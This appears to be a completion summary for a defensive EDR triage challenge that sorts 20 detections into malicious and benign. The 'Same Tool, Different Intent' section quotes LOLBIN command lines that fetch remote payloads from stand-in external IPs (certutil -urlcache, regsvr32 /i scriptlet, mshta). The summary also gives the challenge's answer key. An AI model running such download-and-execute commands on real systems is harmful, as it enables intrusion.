# EDR Telemetry Validation - Challenge Summary

## 📁 Directory Contents

```
WEEK 6 - EDR Telemetry Validation/
├── README.md                      # Quick reference guide
├── INVESTIGATION_REPORT.md        # Complete detailed analysis (main document)
├── FLAGS.md                       # All 20 captured flags
├── edr_detections.json           # Raw EDR telemetry data (606 lines)
├── detailed_reanalysis.json      # Full analysis results
├── extract_edr_simple.py         # Script: Extract detections from server
├── 02_analyze_detections.py      # Script: Initial classification
└── 04_deep_reanalysis.py         # Script: Deep verification
```

---

## 🎯 Challenge Overview

**Type**: Interactive EDR Detection Classification  
**Format**: Click-based card interface  
**Goal**: Classify 20 detections as BLOCK (malicious) or ALLOW (benign)  
**Penalty**: Incorrect classification reshuffles all cards  
**Result**: ✅ **100% Accuracy - All 20 flags captured**

---

## 📊 Final Results

### Classification Breakdown
| Classification | Count | Percentage |
|----------------|-------|------------|
| True Positive (Malicious) | 10 | 50% |
| False Positive (Benign) | 10 | 50% |
| **Total Detections** | **20** | **100%** |

### Action Summary
- **BLOCK Actions**: 10 (Detections 1-10)
- **ALLOW Actions**: 10 (Detections 11-20)

---

## 🔑 Quick Classification Guide

### 🔴 BLOCK (Malicious) - Detections 1-10
1. ❌ **BYOVD** - Unsigned loader installing vulnerable driver
2. ❌ **DLL Injection** - Code injection into notepad from Office doc
3. ❌ **Dropper** - Staging remote payload
4. ❌ **LSASS Dump** - Credential theft via mimikatz variant
5. ❌ **Hookchain** - Known injection tool
6. ❌ **Certutil Download** - Remote payload fetch (`-urlcache`)
7. ❌ **Regsvr32 Remote** - Squiblydoo attack (remote scriptlet)
8. ❌ **Mshta Remote** - Remote HTA from external IP
9. ❌ **Bitsadmin Transfer** - Binary download from external source
10. ❌ **InstallUtil** - Executing "evil.dll"

### 🟢 ALLOW (Benign) - Detections 11-20
11. ✅ **Backup Agent** - Enterprise backup to vendor cloud
12. ✅ **Driver Update** - Vendor-signed driver installation
13. ✅ **ProcDump IIS** - Troubleshooting w3wp.exe (NOT lsass!)
14. ✅ **MSBuild** - CI/CD build pipeline
15. ✅ **Remote Admin** - IT patching via PsExec-like tool
16. ✅ **Certutil Verify** - VPN certificate validation (`-verify`)
17. ✅ **Regsvr32 Vendor** - Registering signed DLL from msiexec
18. ✅ **Mshta Enrollment** - Corporate enrollment (internal domain)
19. ✅ **Rundll32 Control** - Standard Control Panel invocation
20. ✅ **Bitsadmin WU** - Windows Update service usage

---

## 💡 Key Insights

### 1. Severity is Misleading
| Detection | Severity | Actual Classification |
|-----------|----------|----------------------|
| Backup Agent (#11) | Critical | ✅ Benign |
| Regsvr32 Vendor (#17) | Critical | ✅ Benign |
| ProcDump IIS (#13) | High | ✅ Benign |
| Certutil Download (#6) | Low | ❌ Malicious |
| BYOVD (#1) | Low | ❌ Malicious |

**Lesson**: Never trust severity alone - always analyze context!

### 2. Same Tool, Different Intent

#### Certutil
- ✅ **Benign**: `certutil -verify myvpn.cer` (certificate validation)
- ❌ **Malicious**: `certutil -urlcache http://198.51.100.60/a.bin` (download)

#### Regsvr32
- ✅ **Benign**: `regsvr32 C:\Program Files\Vendor\Plugin.dll` (local signed DLL)
- ❌ **Malicious**: `regsvr32 /i:http://203.0.113.77/file.sct scrobj.dll` (remote scriptlet)

#### Mshta
- ✅ **Benign**: `mshta https://enroll.corp/JoinDevice.hta` (internal domain)
- ❌ **Malicious**: `mshta http://198.51.100.90/portal.hta` (external IP)

#### Bitsadmin
- ✅ **Benign**: `svchost.exe (wuauserv) → bitsadmin /monitor` (Windows Update)
- ❌ **Malicious**: `powershell.exe → bitsadmin /transfer http://...` (download)

### 3. Process Relationships Matter
- `msiexec.exe → regsvr32` = Software installation (✅ benign)
- `winword.exe → mshta` = Phishing vector (❌ malicious)
- `svchost.exe (wuauserv) → bitsadmin` = Windows Update (✅ benign)
- `powershell.exe → bitsadmin` = Scripted attack (❌ malicious)

### 4. File Path Analysis
**Legitimate**:
- `C:\Program Files\` - Installed applications
- `C:\Tools\Sysinternals\` - Known tool suites

**Suspicious**:
- `C:\Users\Public\` - World-writable, common malware staging
- `C:\Windows\Temp\` - Temporary location for malware
- `C:\ProgramData\svc\` - Non-standard service paths

---

## 🛠️ Investigation Workflow

### Step 1: Data Extraction
```bash
# Start EDR server
.\iredrserver_windows_amd64.exe

# Extract all detections
python extract_edr_simple.py
# Output: edr_detections.json (20 detections)
```

### Step 2: Initial Analysis
```bash
python 02_analyze_detections.py
# Output: Classification with reasoning
```

### Step 3: Deep Verification
```bash
python 04_deep_reanalysis.py
# Output: Full telemetry analysis with verdicts
```

### Step 4: Interactive Classification
- Click **BLOCK** for detections 1-10 (malicious)
- Click **ALLOW** for detections 11-20 (benign)
- Each correct click reveals a flag

---

## 📈 Threat Distribution

### Malicious Activity (True Positives)
```
Process Injection:  ███ 30% (3 detections)
LOLBIN Abuse:      █████ 50% (5 detections)
Credential Access:  █ 10% (1 detection)
BYOVD Attack:      █ 10% (1 detection)
Dropper/Staging:   █ 10% (1 detection)
```

### Benign Activity (False Positives)
```
IT Operations:     ████ 40% (4 detections)
Legitimate LOLBINs: █████ 50% (5 detections)
Dev Tooling:       █ 10% (1 detection)
```

---

## 🎓 Skills Demonstrated

✅ **EDR Telemetry Analysis** - Deep dive into endpoint detection data  
✅ **Process Behavior Analysis** - Understanding execution chains  
✅ **LOLBIN Identification** - Distinguishing tool abuse patterns  
✅ **Context Evaluation** - User, host, and operational awareness  
✅ **False Positive Reduction** - Avoiding over-blocking  
✅ **MITRE ATT&CK Mapping** - Technique identification  
✅ **Threat Intelligence** - Recognizing known attack patterns  
✅ **Python Automation** - Script development for analysis  

---

## ✅ Challenge Status

**Completion**: 100% ✅  
**Flags Captured**: 20/20 ✅  
**Accuracy**: 100% ✅  
**Date Completed**: November 9, 2025 ✅  

---

## 📖 Documentation

For complete analysis of all 20 detections with full telemetry, reasoning, and flags:
👉 **Read INVESTIGATION_REPORT.md** (comprehensive 500+ line report)

For quick reference:
👉 **Read README.md**

For all flags:
👉 **Read FLAGS.md**

---

**Status**: ✅ **CHALLENGE COMPLETE**
